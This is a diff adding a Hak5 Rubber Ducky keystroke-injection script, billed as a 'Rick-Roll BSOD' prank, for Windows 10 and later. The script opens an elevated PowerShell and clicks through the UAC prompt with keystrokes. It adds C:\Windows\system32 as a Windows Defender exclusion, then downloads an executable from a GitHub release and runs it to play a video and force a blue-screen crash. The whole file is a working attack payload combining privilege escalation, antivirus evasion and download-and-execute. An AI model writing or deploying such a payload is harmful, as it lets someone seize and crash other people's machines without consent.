@@ -1,0 +1,22 @@
+REM Title: Rick-Roll BSOD
+REM Author: FalsePhilosopher + AGO061
+REM Target:  Win 10+, exe is Windows 7 and up 32/64 bit
+REM Props: Hak5, bemxio for creating mario-head https://github.com/bemxio/mario-head, 3ctOs for the PS bits I used https://github.com/3ct0s/badusb-download-execute-disable-windows-defender and memes, AGO061 for making the rickroll version
+REM Version: 1.0
+REM Category: Prank
+REM Display a video of a rick rolll, the video glitches and explodes and invokes a BSOD.
+DELAY 400
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 850
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1000
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/AGO061/rickroll-bsod/releases/download/first-version/rick_dist.exe';$file='rick_dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+ENTER
